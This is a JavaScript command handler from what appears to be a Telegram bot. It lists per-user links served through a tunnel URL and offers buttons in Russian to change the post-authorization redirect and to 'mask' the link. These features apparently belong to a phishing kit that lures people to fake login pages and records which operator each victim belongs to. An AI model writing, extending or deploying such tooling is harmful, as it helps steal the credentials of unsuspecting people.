var links = require(`../json/links.json`),
    get_user = require("../functions/get_user"),
    save_user = require("../functions/save_user");

module.exports = {
	r: /^(link)$/i,
	f: function (msg, chatId, args, data) {
        get_user.start(chatId, (info) => {
            var links_list = [];
            links.forEach((data) => {
                if(global.tunnel) {
                    links_list.push(`<a href="${global.tunnel.url}/${data.link}/${chatId}">${data.name}</a> ➡️ <code>${global.tunnel.url}/${data.link}/${chatId}</code>`)     
                }
            });    
            data({
                text: `<b>🗒 Ссылки 🗒</b>\n${links_list.join(`\n\n`)}\n\n🚪 Переход после авторизации: ${info.link}`,
                keyboard: [
                    [{"text": `Изменить ссылку 🏷`, callback_data: "edit_link"}],
                    [{"text": "Маскировать ссылку  🎭", callback_data: "mask_link"}],
                    [{"text": `◀️ Назад `, callback_data: "menu"}]
                  ]
            });
            return save_user.start(chatId, info);
        });
	},
	desc: "",
	rights: 0,
	type: "all"
}